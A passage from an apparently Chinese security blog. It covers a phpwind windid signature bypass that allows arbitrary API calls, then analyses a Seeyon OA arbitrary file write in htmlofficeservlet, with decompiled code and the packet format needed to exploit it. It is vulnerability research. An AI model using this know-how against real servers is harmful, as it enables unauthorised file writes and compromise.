<p>拿到的windidkey(7d0cff9b85cc0f62fe062421d1caf067)是md5(md5($apiId.’||’.$secretkey).$time.’typeflashuid2uidundefined’)的值, 从FlashVars中可以拿到time和apiId(clintid)所以也就是md5(md5(‘1’.’||’.$secretkey).’1567155029’.’typeflashuid2uidundefined’)        uid2这个每个环境都不同,不过uid也输出到了FlashVars中。</p>
<p>接着来看调用管理的api时是如何对签名进行校验的,</p>
<p>src/applications/windidserver/api/controller/OpenBaseController.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">beforeAction</span>(<span class="params">$handlerAdapter</span>) </span>&#123;</span><br><span class="line">	<span class="built_in">parent</span>::beforeAction($handlerAdapter);</span><br><span class="line">	$charset = <span class="string">&#x27;utf-8&#x27;</span>;</span><br><span class="line">	$_windidkey = <span class="keyword">$this</span>-&gt;getInput(<span class="string">&#x27;windidkey&#x27;</span>, <span class="string">&#x27;get&#x27;</span>);</span><br><span class="line">	$_time = (<span class="keyword">int</span>)<span class="keyword">$this</span>-&gt;getInput(<span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;get&#x27;</span>);</span><br><span class="line">	$_clientid = (<span class="keyword">int</span>)<span class="keyword">$this</span>-&gt;getInput(<span class="string">&#x27;clientid&#x27;</span>, <span class="string">&#x27;get&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!$_time || !$_clientid) <span class="keyword">$this</span>-&gt;output(WindidError::FAIL);</span><br><span class="line">	$clent = <span class="keyword">$this</span>-&gt;_getAppDs()-&gt;getApp($_clientid);</span><br><span class="line">	<span class="keyword">if</span> (!$clent) <span class="keyword">$this</span>-&gt;output(WindidError::FAIL);</span><br><span class="line">	<span class="keyword">if</span> (WindidUtility::appKey($clent[<span class="string">&#x27;id&#x27;</span>], $_time, $clent[<span class="string">&#x27;secretkey&#x27;</span>], <span class="keyword">$this</span>-&gt;getRequest()-&gt;getGet(<span class="literal">null</span>), <span class="keyword">$this</span>-&gt;getRequest()-&gt;getPost()) != $_windidkey)  <span class="keyword">$this</span>-&gt;output(WindidError::FAIL);</span><br><span class="line">	</span><br><span class="line">	$time = Pw::getTime();</span><br></pre></td></tr></table></figure>

<p>time、clientid都已知, 这里因为m、c、a参数并不会加入签名计算,我们只要构造出typeflashuid2uidundefined就能通过判断进而调用任意Api方法。</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/phpwind_1.png" alt="1567155842824"></p>
<h2 id="如何判断是否为GBK版本"><a href="#如何判断是否为GBK版本" class="headerlink" title="如何判断是否为GBK版本"></a>如何判断是否为GBK版本</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;GBK&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>本站新帖 - phpwind 9.0 - Powered by phpwind<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>直接查看meta标签的charset属性就能确定。</p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzA5NzQxOTQ1MA==&amp;mid=2247483676&amp;idx=1&amp;sn=161d456328bdcf71b65a03a3376891dc">https://mp.weixin.qq.com/s?__biz=MzA5NzQxOTQ1MA==&amp;mid=2247483676&amp;idx=1&amp;sn=161d456328bdcf71b65a03a3376891dc</a></li>
</ol>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Web/">Web</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/07/14/致远oa-任意文件写入漏洞分析/"><span>致远oa 任意文件写入漏洞分析</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/07/14/致远oa-任意文件写入漏洞分析/" rel="bookmark">
        <time class="entry-date published" datetime="2019-07-14T12:03:24.000Z">
          2019-07-14
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><pre><code>之前写的文章了,一开始发到了其他地方,想了想还是copy一份到博客里增加点数量。</code></pre>
<p>​    前段时间致远oa爆出了任意文件写入漏洞, 当时广为流传的poc中数据包一些参数值被编码, 最初由于不知道加密方式编写poc不太方便,在拿到了致远oa的源码后对该漏洞进行了分析并编写poc。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>​    漏洞本身是一个很简单的漏洞,但是因为加密的原因稍微使利用麻烦了一点。</p>
<p>​    漏洞出现在 \WEB-INF\lib\seeyon-apps-common.jar!\com\seeyon\ctp\common\office\HtmlOfficeServlet.class,该类为一个Servlet。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>htmlofficeservlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/htmlofficeservlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>htmlofficeservlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        com.seeyon.ctp.common.office.HtmlOfficeServlet</span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​    在web.xml中, 将/htmlofficeservlet映射到了该Servlet。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HtmlOfficeServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    ..............................</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        AppContext.initSystemEnvironmentContext(request, response);</span><br><span class="line">        HandWriteManager handWriteManager = (HandWriteManager)AppContext.getBean(<span class="string">&quot;handWriteManager&quot;</span>);</span><br><span class="line">        HtmlHandWriteManager htmlHandWriteManager = (HtmlHandWriteManager)AppContext.getBeanWithoutCache(<span class="string">&quot;htmlHandWriteManager&quot;</span>);</span><br><span class="line">        iMsgServer2000 msgObj = <span class="keyword">new</span> iMsgServer2000();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            handWriteManager.readVariant(request, msgObj);</span><br><span class="line">            <span class="keyword">if</span> (AppContext.currentUserId() == -<span class="number">1L</span>) &#123;</span><br><span class="line">                User user = handWriteManager.getCurrentUser(msgObj);</span><br><span class="line">                AppContext.putThreadContext(<span class="string">&quot;SESSION_CONTEXT_USERINFO_KEY&quot;</span>, user);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            msgObj.SetMsgByName(<span class="string">&quot;CLIENTIP&quot;</span>, Strings.getRemoteAddr(request));</span><br><span class="line">            String option = msgObj.GetMsgByName(<span class="string">&quot;OPTION&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;LOADFILE&quot;</span>.equalsIgnoreCase(option)) &#123;</span><br><span class="line">                handWriteManager.LoadFile(msgObj);</span><br><span class="line">            .................................................</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;SAVEASIMG&quot;</span>.equalsIgnoreCase(option)) &#123;</span><br><span class="line">                String fileName = msgObj.GetMsgByName(<span class="string">&quot;FILENAME&quot;</span>);</span><br><span class="line">                String tempFolder = (<span class="keyword">new</span> File((<span class="keyword">new</span> File(<span class="string">&quot;&quot;</span>)).getAbsolutePath())).getParentFile().getParentFile().getPath();</span><br><span class="line">                String tempPath = tempFolder + <span class="string">&quot;/base/upload/taohongTemp&quot;</span>;</span><br><span class="line">                File folder = <span class="keyword">new</span> File(tempPath);</span><br><span class="line">                <span class="keyword">if</span> (!folder.exists()) &#123;</span><br><span class="line">                    folder.mkdir();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                msgObj.MsgFileSave(tempPath + <span class="string">&quot;/&quot;</span> + fileName);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>​    在该Servlet中, 存在一个SAVEASIMG操作, 从msgObj中获取到FILENAME后与tempPath拼接成最终保存路径,传递给MsgFileSave方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">MsgFileSave</span><span class="params">(String var1)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        FileOutputStream var2 = <span class="keyword">new</span> FileOutputStream(var1);</span><br><span class="line">        var2.write(<span class="keyword">this</span>.FMsgFile);</span><br><span class="line">        var2.close();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">        <span class="keyword">this</span>.FError = <span class="keyword">this</span>.FError + var3.toString();</span><br><span class="line">        System.out.println(var3.toString());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    在MsgFileSave方法当中, 直接使用拼接的路径与this.FMsgFile实现了文件保存。所以只要能够控制option、fileName和this.FMsgFile即可实现任意文件保存。这三个变量均来自iMsgServer2000实例对象, 在DBStep.jar包中能够找到iMsgServer2000类的代码。iMsgServer2000实例对象由handWriteManager.readVariant方法处理用户发送的request生成。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readVariant</span><span class="params">(HttpServletRequest request, iMsgServer2000 msgObj)</span> </span>&#123;</span><br><span class="line">    msgObj.ReadPackage(request);</span><br><span class="line">    <span class="keyword">this</span>.fileId = Long.valueOf(msgObj.GetMsgByName(<span class="string">&quot;RECORDID&quot;</span>));</span><br><span class="line">    <span class="keyword">this</span>.createDate = Datetimes.parseDatetime(msgObj.GetMsgByName(<span class="string">&quot;CREATEDATE&quot;</span>));</span><br><span class="line">    String _originalFileId = msgObj.GetMsgByName(<span class="string">&quot;originalFileId&quot;</span>);</span><br><span class="line">    <span class="keyword">this</span>.needClone = _originalFileId != <span class="keyword">null</span> &amp;&amp; !<span class="string">&quot;&quot;</span>.equals(_originalFileId.trim());</span><br><span class="line">    <span class="keyword">this</span>.needReadFile = Boolean.parseBoolean(msgObj.GetMsgByName(<span class="string">&quot;needReadFile&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.needClone) &#123;</span><br><span class="line">        String _originalCreateDate = msgObj.GetMsgByName(<span class="string">&quot;originalCreateDate&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.originalFileId = Long.valueOf(_originalFileId);</span><br><span class="line">        <span class="keyword">this</span>.originalCreateDate = Datetimes.parseDatetime(_originalCreateDate);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>​    接着调用iMsgServer2000#ReadPackage生成msgObj对象, 在生成msgObj对象后从该对象获取参数值, 可以看出msgObj中必须含有RECORDID、CREATEDATE参数并且需要符合它的数据类型, 在获取到参数值后有进行类型转换等操作, 如果获取不到参数值或获取到的参数值与相应的数据类型不匹配, 那么在进行类型转换时会出现异常进而退出流程。这两个参数值和最终的漏洞利用并无关系, 只是为了避免异常而必须设置, 在该方法中可以看到还获取了一些其他的参数值, 不过其他的就算不设置也不会发生异常。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] ReadPackage(HttpServletRequest var1) &#123;</span><br><span class="line">      <span class="keyword">int</span> var2 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">boolean</span> var3 = <span class="keyword">false</span>;</span><br><span class="line">      <span class="keyword">boolean</span> var4 = <span class="keyword">false</span>;</span><br><span class="line">      <span class="keyword">this</span>.Charset = var1.getCharacterEncoding();</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.Charset == <span class="keyword">null</span>) &#123;</span><br><span class="line">          <span class="keyword">this</span>.Charset = var1.getHeader(<span class="string">&quot;charset&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.Charset == <span class="keyword">null</span>) &#123;</span><br><span class="line">          <span class="keyword">this</span>.Charset = <span class="string">&quot;GB2312&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">int</span> var8 = var1.getContentLength();</span><br><span class="line"></span><br><span class="line">          <span class="keyword">int</span> var7;</span><br><span class="line">          <span class="keyword">for</span>(<span class="keyword">this</span>.FStream = <span class="keyword">new</span> <span class="keyword">byte</span>[var8]; var2 &lt; var8; var2 += var7) &#123;</span><br><span class="line">              var1.getInputStream();</span><br><span class="line">              var7 = var1.getInputStream().read(<span class="keyword">this</span>.FStream, var2, var8 - var2);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="keyword">this</span>.FError == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">              <span class="keyword">this</span>.StreamToMsg();</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>

<p>​    该方法中, 首先获取request中的Content-Length, 然后从request body中获取对应Content-Length字节数的内容保存到this.FStream中, 接着继续调用当前类中的StreamToMsg方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">StreamToMsg</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span> var2 = <span class="number">64</span>;</span><br><span class="line">    <span class="keyword">boolean</span> var3 = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">boolean</span> var4 = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">boolean</span> var5 = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">boolean</span> var6 = <span class="keyword">false</span>;</span><br><span class="line">    String var7 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    String var8 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">this</span>.FMd5Error = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">byte</span> var14 = <span class="number">0</span>;</span><br><span class="line">        String var1 = <span class="keyword">new</span> String(<span class="keyword">this</span>.FStream, var14, var2);</span><br><span class="line">        <span class="keyword">this</span>.FVersion = var1.substring(<span class="number">0</span>, <span class="number">15</span>); <span class="comment">// version</span></span><br><span class="line">        <span class="keyword">int</span> var11 = Integer.parseInt(var1.substring(<span class="number">16</span>, <span class="number">31</span>).trim());	<span class="comment">// 355</span></span><br><span class="line">        <span class="keyword">int</span> var12 = Integer.parseInt(var1.substring(<span class="number">32</span>, <span class="number">47</span>).trim());    <span class="comment">// 0  </span></span><br><span class="line">        <span class="keyword">int</span> var13 = Integer.parseInt(var1.substring(<span class="number">48</span>, <span class="number">63</span>).trim());    <span class="comment">// 666</span></span><br><span class="line">        <span class="keyword">this</span>.FFileSize = var13;		<span class="comment">//  var13 fileSize</span></span><br><span class="line">        <span class="keyword">int</span> var15 = var14 + var2;	<span class="comment">// 0 + 64 = 64</span></span><br><span class="line">        <span class="keyword">if</span> (var11 &gt; <span class="number">0</span>) &#123;			</span><br><span class="line">            <span class="keyword">this</span>.FMsgText = <span class="keyword">new</span> String(<span class="keyword">this</span>.FStream, var15, var11);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var15 += var11;</span><br><span class="line">        <span class="keyword">if</span> (var12 &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.FError = <span class="keyword">new</span> String(<span class="keyword">this</span>.FStream, var15, var12);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var15 += var12;</span><br><span class="line">        <span class="keyword">this</span>.FMsgFile = <span class="keyword">new</span> <span class="keyword">byte</span>[var13];</span><br><span class="line">        <span class="keyword">if</span> (var13 &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> var9 = <span class="number">0</span>; var9 &lt; var13; ++var9) &#123;</span><br><span class="line">                <span class="keyword">this</span>.FMsgFile[var9] = <span class="keyword">this</span>.FStream[var9 + var15];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            var15 += var13;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.FStream.length &gt;= var15 + <span class="number">32</span>) &#123;</span><br><span class="line">                var7 = <span class="keyword">new</span> String(<span class="keyword">this</span>.FStream, var15, <span class="number">32</span>);</span><br><span class="line">                var8 = <span class="keyword">this</span>.MD5Stream(<span class="keyword">this</span>.FMsgFile);</span><br><span class="line">                <span class="keyword">if</span> (var7.compareToIgnoreCase(var8) != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.SetMsgByName(<span class="string">&quot;DBSTEP&quot;</span>, <span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">                    <span class="keyword">this</span>.FMd5Error = <span class="keyword">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">this</span>.FMd5Error = <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>​    在该方法中获取流的前64字节保存到var1中, 前64字节类似报文头,前16字节为版本信息,16-31字节为FMsgText的大小(option、filename变量都是从FMsgText中获取),32到47字节为错误信息的大小 直接定义为0, 48到63字节为FMsgFile的大小。如果流中48到64字节转整后的内容(即var13变量)大于0, 那么会从 var15字节后开始读取内容保存到FMsgFile成员属性中, 从上面代码中可以看出var15 = var14 + var2 + var11 + var12 即跳过报文头和FMsgText,然后获取var13(即48到63字节内容转整)个字节保存到FMsgFile属性当中。</p>
<p>​    在获取到FMsgFile后, 后面有类似校验签名的一段代码, 校验的是FMsgFile内容的md5值是否与FMsgFile后32字节内容相等, 流传的poc中在最后也带了一段md5,不过可以看出如果整个流的长度如果不大于var15 + 32 (即FMsgFile后的内容不超过32字节)就不会进入该逻辑。不过就算进入该逻辑且签名错了也没有影响, 在其他操作的地方并没有管这签名的正确性。</p>
<p>​    option、fileName变量都是通过调用iMsgServer2000类的GetMsgByName方法获取参数值, </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">GetMsgByName</span><span class="params">(String var1)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> var2 = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">boolean</span> var3 = <span class="keyword">false</span>;</span><br><span class="line">    String var4 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    String var6 = var1.trim().concat(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> var7 = <span class="keyword">this</span>.FMsgText.indexOf(var6);</span><br><span class="line">    <span class="keyword">if</span> (var7 != -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> var8 = <span class="keyword">this</span>.FMsgText.indexOf(<span class="string">&quot;\r\n&quot;</span>, var7 + <span class="number">1</span>);</span><br><span class="line">        var7 += var6.length();</span><br><span class="line">        <span class="keyword">if</span> (var8 != -<span class="number">1</span>) &#123;</span><br><span class="line">            String var5 = <span class="keyword">this</span>.FMsgText.substring(var7, var8);</span><br><span class="line">            var4 = <span class="keyword">this</span>.DecodeBase64(var5);</span><br><span class="line">            <span class="keyword">return</span> var4;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> var4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> var4;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    GetMsgByName方法当中,  从FMsgText属性值中获取参数值, 获取到参数值为”=”与”\r\n”之间的内容, 获取到参数值后会调用当前对象的DecodeBase64方法进行处理。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">DecodeBase64</span><span class="params">(String var1)</span> </span>&#123;</span><br><span class="line">        ByteArrayOutputStream var2 = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        String var3 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] var8 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">int</span> var5 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">byte</span>[] var7 = var1.getBytes();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(var5 &lt; var7.length) &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> var4 = <span class="number">0</span>; var4 &lt;= <span class="number">3</span>; ++var4) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (var5 &gt;= var7.length) &#123;</span><br><span class="line">                        var8[var4] = <span class="number">64</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">int</span> var6 = <span class="keyword">this</span>.TableBase64.indexOf(var7[var5]);</span><br><span class="line">                        <span class="keyword">if</span> (var6 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                            var6 = <span class="number">65</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        var8[var4] = (<span class="keyword">byte</span>)var6;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    ++var5;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var2.write((<span class="keyword">byte</span>)(((var8[<span class="number">0</span>] &amp; <span class="number">63</span>) &lt;&lt; <span class="number">2</span>) + ((var8[<span class="number">1</span>] &amp; <span class="number">48</span>) &gt;&gt; <span class="number">4</span>)));</span><br><span class="line">                <span class="keyword">if</span> (var8[<span class="number">2</span>] != <span class="number">64</span>) &#123;</span><br><span class="line">                    var2.write((<span class="keyword">byte</span>)(((var8[<span class="number">1</span>] &amp; <span class="number">15</span>) &lt;&lt; <span class="number">4</span>) + ((var8[<span class="number">2</span>] &amp; <span class="number">60</span>) &gt;&gt; <span class="number">2</span>)));</span><br><span class="line">                    <span class="keyword">if</span> (var8[<span class="number">3</span>] != <span class="number">64</span>) &#123;</span><br><span class="line">                        var2.write((<span class="keyword">byte</span>)(((var8[<span class="number">2</span>] &amp; <span class="number">3</span>) &lt;&lt; <span class="number">6</span>) + (var8[<span class="number">3</span>] &amp; <span class="number">63</span>)));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (StringIndexOutOfBoundsException var11) &#123;</span><br><span class="line">            <span class="keyword">this</span>.FError = <span class="keyword">this</span>.FError + var11.toString();</span><br><span class="line">            System.out.println(var11.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var3 = var2.toString(<span class="keyword">this</span>.Charset);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException var10) &#123;</span><br><span class="line">            System.out.println(var10.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var3;</span><br><span class="line">    